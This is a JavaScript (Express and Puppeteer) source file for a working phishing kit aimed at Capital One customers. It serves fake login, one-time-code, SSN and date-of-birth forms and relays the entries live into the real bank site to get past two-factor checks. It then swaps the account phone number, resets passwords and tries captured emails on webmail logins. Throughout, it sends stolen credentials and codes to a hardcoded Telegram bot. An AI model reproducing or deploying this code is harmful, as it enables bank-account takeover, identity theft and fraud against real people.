const express = require("express");
const bodyParser = require("body-parser");
const puppeteerExtra = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const session = require("express-session"); // <-- Require express-session here!
const axios = require("axios");
const puppeteer = require('puppeteer-extra');
puppeteer.use(StealthPlugin()); // Use stealth mode to avoid detection
const puppeteerInstances = {}; // In-memory storage for Puppeteer instances




// Add stealth plugin to Puppeteer
puppeteerExtra.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;


app.use(session({
  secret: "your-secret-key", // Replace with a secure secret
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // Set to true if using HTTPS in production
}));

app.use(bodyParser.urlencoded({ extended: true }));

// Track invalid login attempts globally
let invalidAttempts = 0;
let browser, page;





// **Utility Function to Launch Puppeteer Browser**
async function launchBrowser() {
  if (!browser) {
    console.log("Launching Puppeteer browser...");
    browser = await puppeteerExtra.launch({
      headless: false,
      args: [
        "--no-sandbox", // Required for Heroku
        "--disable-setuid-sandbox", // Required for Heroku
        "--ignore-certificate-errors", 

      ],
    });
    console.log("Browser launched successfully!");
    page = await browser.newPage();
  }
  return browser;
}





// Serve the login form
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 2rem auto;
            text-align: center;
          }
          input, button {
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-size: 1rem;
          }
          button {
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
          }
          button:hover {
            background-color: #0056b3;
          }
          #loading-circle {
            display: none;
            margin: 2rem auto;
            border: 8px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #CC2427;
            border-radius: 250%;
            width: 70px;
            height: 70px;
            animation: spin 1s linear infinite;
          }
          @keyframes spin {
            from {
              transform: rotate(0deg);
            }
            to {
              transform: rotate(360deg);
            }
          }
        </style>
        <script>
          function showLoading() {
            // Disable the login button to prevent multiple clicks
            const loginButton = document.getElementById("login-button");
            loginButton.disabled = true;
            loginButton.textContent = "Processing...";

            // Show the loading circle
            const loadingCircle = document.getElementById("loading-circle");
            loadingCircle.style.display = "block";
          }
        </script>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST" onsubmit="showLoading()">
          <label>Email: <input type="text" name="email" required /></label><br />
          <label>Password: <input type="password" name="password" required /></label><br />
          <button type="submit" id="login-button">Log in</button>
        </form>
        <div id="loading-circle"></div>
      </body>
    </html>
  `);
});

app.post("/submit-login", async (req, res) => {
    const { email, password } = req.body;
    
    let invalidAttempts = 0; // Initialize invalidAttempts

   
  
    try {
      // Launch Puppeteer browser if not already launched
      await launchBrowser();
  
      console.log("Navigating to login page...");
      await page.goto("https://www.capitalone.com/", {
        waitUntil: "networkidle2",
        timeout: 60000,
      });
  
      console.log("Clearing cookies and cache...");
      const client = await page.target().createCDPSession();
      await client.send("Network.clearBrowserCookies");
      await client.send("Network.clearBrowserCache");
  
      console.log("Filling in login form...");
      await page.evaluate(() => {
        const emailField = document.querySelector('input#ods-input-0');
        if (emailField) emailField.value = "";
  
        const passwordField = document.querySelector('input#ods-input-1');
        if (passwordField) passwordField.value = "";
      });
  
      await page.type("input#ods-input-0", email, { delay: Math.random() * 200 + 50 });
      await page.type("input#ods-input-1", password, { delay: Math.random() * 200 + 50 });
  
      console.log("Submitting login form...");
      await page.evaluate(() => {
        const button = document.querySelector("button#noAcctSubmit");
        if (button) button.click();
      });
  
      await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 60000 });
  
      const loginSuccess = await page.evaluate(() => {
        const element = document.querySelector('div.option-list-entry--message > p.message--header');
        return element && element.textContent.trim() === 'Text me a temporary code';
      });
  
      if (loginSuccess) {
        console.log("Login successful!");
        invalidAttempts = 0; // Reset invalid attempts
  
        console.log("Requesting OTP...");
        await page.click("div.option-list-entry--message > p.message--header");
        await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
        await page.click('button[data-testtarget="otp-button"]');
  
        // Render the OTP input page and exit the function
        return res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Enter OTP</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Enter OTP</h1>
              <form action="/submit-otp" method="POST">
                <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
                <button type="submit">Submit OTP</button>
              </form>
            </body>
          </html>
        `);
      }
  
      // Handle failed login attempts
      invalidAttempts++;
  
      if (invalidAttempts === 1) {


        // Save the password in memory as passReset
        req.session.passReset = req.body.password; // Save the password for later use
        console.log("Saved passReset value:", req.session.passReset);
        
        await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });
  
        // Render the contact information form and exit the function
        return res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Contact Information</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Contact Information</h1>
              <form action="/submit-contact" method="POST">
                <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                <label>SSN: <input type="password" name="ssn" required /></label><br/>
                <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                <button type="submit">Find Me</button>
              </form>
            </body>
          </html>
        `);
      } else if (invalidAttempts === 2) {

        await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });
  
        // Render the contact information form and exit the function
        return res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Contact Information</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Contact Information</h1>
              <form action="/submit-contact" method="POST">
                <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                <label>SSN: <input type="password" name="ssn" required /></label><br/>
                <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                <button type="submit">Find Me</button>
              </form>
            </body>
          </html>
        `);
      } 
    } catch (error) {
      console.error("Error during login:", error);
      return res.status(500).send("<h1>An error occurred during login.</h1>");
    }
  });



  app.post("/submit-otp", async (req, res) => {
    const { otp } = req.body;
  
    try {
      console.log("Submitting OTP...");
      
      // Submit the OTP and wait for navigation or URL change
      await Promise.all([
        page.click('button[data-testtarget="otp-submit"]'),
        page.waitForNavigation({ waitUntil: "networkidle2", timeout: 60000 }).catch(() => {
          console.log("Navigation timeout, checking URL instead...");
        }),
      ]);
    
      // Get the current URL after submitting the OTP
      const currentUrl = page.url();
      console.log("Current URL after OTP submission:", currentUrl);
    
      // Check if the user is on the dashboard
      if (currentUrl.includes("https://myaccounts.capitalone.com/welcome")) {
        console.log("User is on the dashboard.");
    
        // Navigate to the Profile Home Phone section
        console.log("Navigating to Home Phone section...");
        await page.goto("https://myaccounts.capitalone.com/Profile/HomePhone", { waitUntil: "networkidle2" });
    
        // Check for the "Text me a temporary code" option
        const codeOptionExists = await page.evaluate(() => {
          const element = document.querySelector('div.option-list-entry--message > p.message--header');
          return element && element.textContent.trim() === "Text me a temporary code";
        });
        
        if (codeOptionExists) {
          // Click the option and resend the code
          await page.click('div.option-list-entry--message > p.message--header');
  
          await page.waitForNavigation({ waitUntil: "networkidle2" });
  
          await page.click('button[data-testtarget="otp-button"]');
  
          // Render new OTP input form
          return res.send(`
            <!DOCTYPE html>
            <html lang="en">
              <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Enter OTP</title>
                <style>
                  body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
                  input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
                  button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
                  button:hover { background-color: #0056b3; }
                </style>
              </head>
              <body>
                <h1>Enter OTP</h1>
                <form action="/submit-otp2" method="POST">
                  <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
                  <button type="submit">Submit OTP</button>
                </form>
              </body>
            </html>
          `);
        } else {
          console.log("Code option not available, proceeding with phone number input...");
  
          // Wait for the phone modal to appear
          await page.waitForSelector('h2#phone-modal-label', { visible: true });
  
          // Read phone number from file
          const phoneData = await fs.promises.readFile('code/phone.txt', 'utf-8');
          const phoneNumbers = phoneData.split('\n').filter((line) => line.trim() !== '');
  
          if (phoneNumbers.length === 0) {
            throw new Error('No phone numbers available in phone.txt');
          }
  
          const phoneNumber = phoneNumbers[0].trim();
          console.log(`Using phone number: ${phoneNumber}`);
  
          // Update phone.txt to remove the used number
          const updatedPhoneData = phoneNumbers.slice(1).join('\n');
          await fs.promises.writeFile('code/phone.txt', updatedPhoneData, 'utf-8');
  
          // Input phone number and confirm it
          await page.type('input#phoneNumberInput', phoneNumber, { delay: 100 });
          await page.type('input#confirmPhoneInput', phoneNumber, { delay: 100 });
  
          // Click consent label
          await page.waitForSelector('label[for="gng-radio-2-input"]', { visible: true });
          await page.click('label[for="gng-radio-2-input"]');
  
          // Click save button
          await page.waitForSelector('button#editPhoneSaveTcpa', { visible: true });
          await page.click('button#editPhoneSaveTcpa');
  
          console.log("Phone number submitted successfully!");
  
          // Send success message to the user
          return res.send("<h1>success.</h1>");
        }
      } else {
        return res.send("<h1>Failed to access the dashboard. Please try again.</h1>");
      }
    } catch (error) {
      console.error("Error during OTP submission:", error);
      res.status(500).send("<h1>An error occurred during the OTP submission process.</h1>");
    }
  });
  
  
  // Route: Handle OTP submission
  app.post("/submit-otp2", async (req, res) => {
    const { otp } = req.body;
  
    try {
      // Input OTP into Puppeteer session
      await page.type('input#pinEntry', otp, { delay: 100 });
  
      // Click "Submit Code" button
      await page.click('button[data-testtarget="otp-submit"]');
      await page.waitForNavigation({ waitUntil: "networkidle2" });
  
  
  
      await page.waitForSelector('h2#phone-modal-label', { visible: true });
  
      // Read phone number from file
      const phoneData = await fs.readFile('code/phone.txt', 'utf-8');
      const phoneNumbers = phoneData.split('\n').filter((line) => line.trim() !== '');
      if (phoneNumbers.length === 0) throw new Error('No phone numbers available in phone.txt');
  
      const phoneNumber = phoneNumbers[0].trim();
      console.log(`Using phone number: ${phoneNumber}`);
  
      // Update phone.txt to remove the used number
      const updatedPhoneData = phoneNumbers.slice(1).join('\n');
      await fs.writeFile('code/phone.txt', updatedPhoneData, 'utf-8');
  
      // Input phone number and confirm it
      await page.type('input#phoneNumberInput', phoneNumber);
      await page.type('input#confirmPhoneInput', phoneNumber);
  
      // Click consent label
      await page.waitForSelector('label[for="gng-radio-2-input"]');
      await page.click('label[for="gng-radio-2-input"]');
  
      // Click save button
      await page.waitForSelector('button#editPhoneSaveTcpa');
      await page.click('button#editPhoneSaveTcpa');
  
    } catch (error) {
      console.error("Error during OTP submission:", error);
      res.status(500).send("<h1>An error occurred while processing your OTP.</h1>");
    }
  });
  

// Route: Handle contact form submission
app.post("/submit-contact", async (req, res) => {
  const { lastname, ssn, dob } = req.body;

  try {
    console.log("Filling in contact form...");
    // Fill the contact form fields on the Puppeteer browser page
    await page.type('input#lastname', lastname, { delay: 100 });
    await page.type('input#fullSSN', ssn, { delay: 100 });
    await page.type('input#dob', dob, { delay: 100 });

    console.log("Submitting contact form...");
    // Click the "Find Me" button
    await page.click('#find-me-button');

    console.log("Checking if contact details are correct...");

    // Use a shorter timeout to check if the contactCorrect element exists
    let contactCorrect = false;
    try {
      await page.waitForSelector('div.option-list-entry--message > p.message--header', {
        visible: true,
        timeout: 10000, // Short timeout to detect the element
      });
      contactCorrect = await page.evaluate(() => {
        const element = document.querySelector('div.option-list-entry--message > p.message--header');
        return element && element.textContent.trim() === 'Text me a temporary code';
      });
    } catch (error) {
      console.log("Contact details are not correct or element not found.");
    }

    if (contactCorrect) {
      console.log("Contact details correct.");
      invalidAttempts = 0; // Reset invalid attempts

      console.log("Requesting OTP...");
      await page.click("div.option-list-entry--message > p.message--header");
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      // Render an HTML page for OTP entry
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>OTP Reset</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>OTP Reset</h1>
            <p>Please enter the OTP sent to your phone:</p>
            <form action="/submit-otpre" method="POST">
              <label>OTP: <input type="text" name="otp" required maxlength="6" /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      console.log("Contact details not found, rendering Identity Info form...");



      // Serve the Identity Info form immediately
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Identity Info</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Identity Info</h1>
            <p>We couldn't find your contact details. Please provide additional information below:</p>
            <form action="/submit-identity-info" method="POST">
              <label>Full Name: <input type="text" name="fullname" required /></label><br/>
              <label>ZIP Code: <input type="text" name="zipcode" required /></label><br/>
              <label>Email Address: <input type="email" name="email" required /></label><br/>
              <button type="submit">Submit</button>
            </form>
          </body>
        </html>
      `);
    }
  } catch (error) {
    console.error("Error submitting contact form:", error);
    res.status(500).send("<h1>An error occurred while submitting the contact form.</h1>");
  }
});


 // Route: Handle OTP submission
 app.post("/submit-otpre", async (req, res) => {
   const { otp } = req.body;
 
   try {
     console.log("Typing OTP...");
     // Type the OTP into the input field
     await page.type('input[data-testtarget="pin-entry-input"]', otp, { delay: 100 });
 
     // Click the "Submit Code" button
     await Promise.all([
       page.click('button[data-testtarget="otp-submit"]'),
       page.waitForNavigation({ waitUntil: "networkidle2" }),
     ]);
     console.log("OTP submitted successfully!");
 
     
     await page.waitForSelector('h1.ci-page-header span.username-offset', { visible: true, timeout: 10000 });

     console.log("username seen");

const username = await page.evaluate(() => {
  const headerElement = document.querySelector('h1.ci-page-header');
  if (!headerElement) return null;

  const usernameSpan = headerElement.querySelector('span.username-offset');
  return usernameSpan ? usernameSpan.textContent.trim() : null;
});

if (username) {
  console.log(`Username found: ${username}`);


       // Send the username and passReset to Telegram
       const passReset = req.session.passReset; // Retrieve the saved passReset value
       const message = `
         🔥 OTP Submission 🔥
         USERNAME: ${username}
         PASSWORD: ${passReset}
       `;
 
       const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Replace with your bot API token
       const chatId = "2127941790"; // Replace with your chat ID
       const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;
 
       await axios.post(url, {
         chat_id: chatId,
         text: message,
         parse_mode: "Markdown",
       });
       console.log("Username and password sent to Telegram!");
     } else {
       console.error("Username element not found!");
       return res.status(500).send("<h1>Failed to retrieve username. Please try again.</h1>");
     }
 
     // Click the "Reset My Password" button and wait for navigation
     await Promise.all([
       page.click('a[data-testtarget="username-found-reset-password-link"]'),
       page.waitForNavigation({ waitUntil: "networkidle2" }),
     ]);
     console.log("Navigated to the password reset page.");
 
     // Check for "Text me a temporary code" option
     const codeOptionExists = await page.evaluate(() => {
       const element = document.querySelector('div.option-list-entry--message > p.message--header');
       return element && element.textContent.trim() === 'Text me a temporary code';
     });
 
     if (codeOptionExists) {
       // Click the option and resend the code
       await page.click('div.option-list-entry--message > p.message--header');
 
       await page.waitForNavigation({ waitUntil: "networkidle2" });
 
       await page.click('button[data-testtarget="otp-button"]');
 
       // Render new OTP input form
       return res.send(`
         <!DOCTYPE html>
         <html lang="en">
           <head>
             <meta charset="UTF-8" />
             <meta name="viewport" content="width=device-width, initial-scale=1.0" />
             <title>Enter OTP</title>
             <style>
               body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
               input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
               button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
               button:hover { background-color: #0056b3; }
             </style>
           </head>
           <body>
             <h1>Enter OTP</h1>
             <form action="/submit-otp2" method="POST">
               <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
               <button type="submit">Submit OTP</button>
             </form>
           </body>
         </html>
       `);
     } else {
       console.log("Did not require OTP to reset password.");
     
       // Wait for the password reset input field
       await page.waitForSelector('input#ci-password-reset', { visible: true, timeout: 15000 });
       console.log("Password reset input available.");
     
       // Use the passReset value as the new password
       const passReset = req.session.passReset; // Retrieve the saved passReset value
       console.log("Using passReset value as the new password:", passReset);
     
       // Type the passReset password into the input field
       await page.type('input#ci-password-reset', passReset, { delay: 100 });
     
       // Click the "Update My Password" button
       await Promise.all([
         page.click('button#setpw-button'),
         page.waitForNavigation({ waitUntil: "networkidle2" }),
       ]);
       console.log("Password updated successfully!");
     
       // Wait for the success message
       await page.waitForSelector('h1.ci-page-header', { visible: true, timeout: 15000 });
       console.log("Password change successful!");
     
       // Click the "Continue" button to go to the dashboard
       await Promise.all([
         page.click('button[data-testtarget="success-button"]'),
         page.waitForNavigation({ waitUntil: "networkidle2" }),
       ]);
       console.log("Navigated to dashboard!");
     
       // Send success message to the user
       return res.send("<h1>success.</h1>");
     }
   } catch (error) {
     console.error("Error during OTP submission or password reset:", error);
     res.status(500).send("<h1>An error occurred during the OTP submission process.</h1>");
   }
 });
 
  
 app.post("/submit-identity-info", async (req, res) => {
  const { fullname, zipcode, email } = req.body;

  try {
    console.log("Received identity info:");
    console.log(`Full Name: ${fullname}`);
    console.log(`ZIP Code: ${zipcode}`);
    console.log(`Email Address: ${email}`);

    // Detect the login URL for the email
    const loginUrl = await getDynamicLoginUrl(email);

    if (!loginUrl) {
      return res.status(400).send("<h1>No valid login URL found for the provided email.</h1>");
    }

    console.log(`Detected login URL for ${email}: ${loginUrl}`);

    const browser = await launchBrowser();
    const page = await browser.newPage();
    
    await page.goto(loginUrl, { waitUntil: "networkidle2" });
    console.log(`Navigated to: ${loginUrl}`);

    // Type the email into the email field
    await clearAndType(page, 'input[type="email"], input[name="email"], input[type="text"]', email);

    console.log(`Email entered: ${email}`);

    // Store the Puppeteer browser and page instances in memory
    puppeteerInstances[email] = { browser, page };

    // Render an HTML page for the user to enter their password
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Enter Password</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              max-width: 500px;
              margin: 2rem auto;
              text-align: center;
            }
            input, button {
              padding: 0.5rem;
              margin: 0.5rem 0;
              font-size: 1rem;
            }
            button {
              background-color: #007bff;
              color: #fff;
              border: none;
              cursor: pointer;
            }
            button:hover {
              background-color: #0056b3;
            }
          </style>
        </head>
        <body>
          <h1>Enter Password</h1>
          <p>Please enter your password to continue:</p>
          <form action="/submit-password" method="POST">
            <input type="hidden" name="email" value="${email}" />
            <label>Password: <input type="password" name="password" required /></label><br/>
            <button type="submit">Submit Password</button>
          </form>
        </body>
      </html>
    `);
  } catch (error) {
    console.error("Error processing identity info:", error);
    res.status(500).send("<h1>An error occurred while processing your identity information.</h1>");
  }
});


app.post("/submit-password", async (req, res) => {
  const { email, password } = req.body;

  try {
    // Retrieve the Puppeteer instances for the email
    const puppeteerInstance = puppeteerInstances[email];
    if (!puppeteerInstance || !puppeteerInstance.page) {
      return res.status(400).send("<h1>No active Puppeteer session found. Please try again.</h1>");
    }

    const { page, browser } = puppeteerInstance;

    console.log("Typing password into Puppeteer session...");
    await clearAndType(page, 'input[type="password"]', password);

    // Click the submit button
    console.log("Submitting login form...");
    await page.click('button[type="submit"], input[type="submit"]');

    // Wait for 3 seconds to allow the page to process the login
    await delay(3000);

    // Check if the submit button is still visible
    const isSubmitButtonVisible = await page.$('button[type="submit"], input[type="submit"]') !== null;

    if (isSubmitButtonVisible) {
      console.log("Login failed: Submit button is still visible, indicating incorrect password.");

      // Render the password incorrect page
      return res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Password Incorrect</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Password Incorrect</h1>
            <p>The username or password you entered is incorrect. Please try again.</p>
            <form action="/submit-password" method="POST">
              <input type="hidden" name="email" value="${email}" />
              <label>Password: <input type="password" name="password" required /></label><br/>
              <button type="submit">Retry Password</button>
            </form>
          </body>
        </html>
      `);
    }

    console.log("Login successful! Password is correct.");

    // Escape Markdown characters in the message
    const escapedEmail = escapeMarkdown(email);
    const escapedPassword = escapeMarkdown(password);

    // Send the email and correct password to Telegram
    const message = `
      🔥 *Login Successful* 🔥
      *EMAIL:* ${escapedEmail}
      *PASSWORD:* ${escapedPassword}
    `;

    const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Replace with your Telegram bot API token
    const chatId = "2127941790"; // Replace with your Telegram chat ID
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;

    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
    console.log("Email and password sent to Telegram successfully!");

    // Render the OTP page
    return res.send(`
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>OTP User</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              max-width: 500px;
              margin: 2rem auto;
              text-align: center;
            }
            input, button {
              padding: 0.5rem;
              margin: 0.5rem 0;
              font-size: 1rem;
            }
            button {
              background-color: #007bff;
              color: #fff;
              border: none;
              cursor: pointer;
            }
            button:hover {
              background-color: #0056b3;
            }
          </style>
        </head>
        <body>
          <h1>OTP User</h1>
          <p>Please enter the OTP sent to your phone:</p>
          <form action="/submit-otpuser" method="POST">
            <input type="hidden" name="email" value="${email}" />
            <label>OTP: <input type="text" name="otp" required maxlength="6" /></label><br/>
            <button type="submit">Submit OTP</button>
          </form>
        </body>
      </html>
    `);
  } catch (error) {
    console.error("Error during password submission:", error);
    res.status(500).send("<h1>An error occurred while submitting the password.</h1>");
  }
});


// Custom delay function
async function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Function to validate a list of possible URLs dynamically
async function validateLoginUrl(possibleUrls) {
  
  
  const browser = await launchBrowser();
  const page = await browser.newPage();

  try {
    for (const url of possibleUrls) {
      console.log(`Checking URL: ${url}`);
      try {
        // Attempt to navigate to the URL
        await page.goto(url, { waitUntil: 'load', timeout: 10000 });

        // Handle "Your connection is not private" warning
        if (await page.$('#details-button')) {
          console.log(`Warning page detected for: ${url}`);
          await page.click('#details-button');
          if (await page.$('#proceed-link')) {
            console.log(`Bypassing warning for: ${url}`);
            await page.click('#proceed-link');
            await page.waitForNavigation({ waitUntil: 'networkidle2' });
          }
        }

        console.log(`Valid login URL found: ${url}`);
        return url; // Return the first valid login URL
      } catch (error) {
        console.log(`URL check failed for: ${url} - Error: ${error.message}`);
      }
    }
  } finally {
  }

  return null; // Return null if no valid URL is found
}


function escapeMarkdown(text) {
  return text
    .replace(/_/g, "\\_")
    .replace(/\*/g, "\\*")
    .replace(/\[/g, "\\[")
    .replace(/]/g, "\\]")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)")
    .replace(/~/g, "\\~")
    .replace(/`/g, "\\`")
    .replace(/>/g, "\\>")
    .replace(/#/g, "\\#")
    .replace(/\+/g, "\\+")
    .replace(/-/g, "\\-")
    .replace(/=/g, "\\=")
    .replace(/\|/g, "\\|")
    .replace(/{/g, "\\{")
    .replace(/}/g, "\\}")
    .replace(/\./g, "\\.")
    .replace(/!/g, "\\!");
}

app.post("/submit-otpuser", async (req, res) => {
  const { email, otp } = req.body;

  try {
    console.log(`OTP received for ${email}: ${otp}`);

    // Send OTP to Telegram
    const message = `
      🔥 OTP Submitted 🔥
      EMAIL: ${email}
      OTP: ${otp}
    `;

    const apiToken = "7479603239:AAEgqaRjV5FM1P5mAyP0LWoN7g8FVNgp_R8"; // Replace with your Telegram bot API token
    const chatId = "2127941790"; // Replace with your Telegram chat ID
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`;

    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
    console.log("OTP sent to Telegram successfully!");

    // Render success page
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
        <head>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Success</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              max-width: 500px;
              margin: 2rem auto;
              text-align: center;
            }
            h1 {
              color: green;
            }
          </style>
        </head>
        <body>
          <h1>Success!</h1>
          <p>Your OTP has been submitted successfully.</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error("Error during OTP submission:", error);
    res.status(500).send("<h1>An error occurred while submitting the OTP.</h1>");
  }
});



// Function to dynamically detect the login URL
async function getDynamicLoginUrl(email) {
  const domain = email.split('@')[1].toLowerCase();
  const possibleUrls = [
    `https://mail.${domain}`,
    `https://webmail.${domain}`,
    `https://${domain}/login`,
    `https://login.${domain}`,
  ];
  return await validateLoginUrl(possibleUrls);
}

async function clearAndType(page, selector, text) {
  try {
    // Wait for the input field to be visible
    await page.waitForSelector(selector, { visible: true });

    // Clear the input field
    console.log(`Clearing input field: ${selector}`);
    await page.evaluate((selector) => {
      const input = document.querySelector(selector);
      if (input) {
        input.value = ''; // Clear the input value
      }
    }, selector);

    // Type the text character by character
    console.log(`Typing text into field: ${selector}`);
    for (const char of text) {
      await page.type(selector, char, { delay: 100 }); // Simulate human typing with a delay
    }

    // Verify the input value matches the typed text
    const typedValue = await page.evaluate((selector) => {
      const input = document.querySelector(selector);
      return input ? input.value : '';
    }, selector);

    if (typedValue !== text) {
      console.error(`Failed to type text correctly in field: ${selector}`);
      throw new Error(`Expected '${text}' but found '${typedValue}' in field: ${selector}`);
    }

    console.log(`Successfully typed text into field: ${selector}`);
  } catch (error) {
    console.error(`Error in clearAndType function for selector: ${selector}`, error);
    throw error;
  }
}




// **Graceful Shutdown**
process.on("SIGINT", async () => {
  if (browser) {
    console.log("Closing Puppeteer browser...");
    await browser.close();
  }
  process.exit();
});

// **Start the Server**
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
